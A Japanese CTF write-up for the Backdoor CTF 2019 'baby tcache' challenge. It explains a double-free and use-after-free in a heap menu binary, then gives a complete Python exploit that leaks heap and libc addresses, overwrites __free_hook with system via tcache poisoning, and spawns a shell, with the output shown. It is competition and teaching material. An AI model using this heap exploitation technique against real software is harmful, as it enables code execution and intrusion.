# [pwn 201pts] baby tcache - Backdoor CTF 2019
64ビットバイナリで、全部有効です。
```
$ checksec -f babytcache
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols      Yes     0               2       babytcache
```
add, edit, free, viewがあります。freeでデータを残すのでdouble freeがあります。freeの回数は制限されていますが5回まで使えます。addも7個まです。
unsorted binサイズのチャンクに入れてfreeすればlibc leakできます。このためにチャンクをoverlapする必要がありますが、ここにfreeが3回必要です。
あとはtcache poisoningに1回（UAFがあるので）、systemを呼ぶだめに1回使います。
```python
from ptrlib import *

def add(index, size, data):
    sock.sendlineafter(">> ", "1")
    sock.sendlineafter(":\n", str(index))
    sock.sendlineafter(":\n", str(size))
    sock.sendafter(":\n", data)
    return

def edit(index, data):
    sock.sendlineafter(">> ", "2")
    sock.sendlineafter(":\n", str(index))
    sock.sendafter(":\n", data)
    return

def delete(index):
    sock.sendlineafter(">> ", "3")
    sock.sendlineafter(":\n", str(index))
    return

def show(index):
    sock.sendlineafter(">> ", "4")
    sock.sendlineafter(":\n", str(index))
    sock.recvuntil(":")
    return sock.recvline()

libc = ELF("./libc.so.6")
sock = Process("./babytcache")
libc_main_arena = 0x3ebc40

add(0, 0x1f8, "A")
add(1, 0x1f8, "B")
add(2, 0x1f8, "/bin/sh")
add(3, 0x88, (p64(0) + p64(0x21)) * 8)

# heap leak
delete(1)
delete(0)
addr_heap = u64(show(0))
logger.info("heap = " + hex(addr_heap))

# libc leak
edit(0, p64(addr_heap - 0x10))
add(4, 0x1f8, "A")
add(5, 0x1f8, p64(0) + p64(0x431))
delete(1)
libc_base = u64(show(1)) - 96 - libc_main_arena
logger.info("libc = " + hex(libc_base))

# tcache poisoning
delete(0)
edit(0, p64(libc_base + libc.symbol("__free_hook")))
add(6, 0x1f8, "dummy")
add(7, 0x1f8, p64(libc_base + libc.symbol("system")))

# get the shell!
delete(2)

sock.interactive()
```

ほい。
```
$ python solve.py 
[+] __init__: Successfully created new process (PID=27553)
[+] <module>: heap = 0x555555757460
[+] <module>: libc = 0x7ffff79e4000
[ptrlib]$ id
uid=1000(ptr) gid=1000(ptr) groups=1000(ptr),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),999(docker)
```

# 感想
やるだけ問ですね。
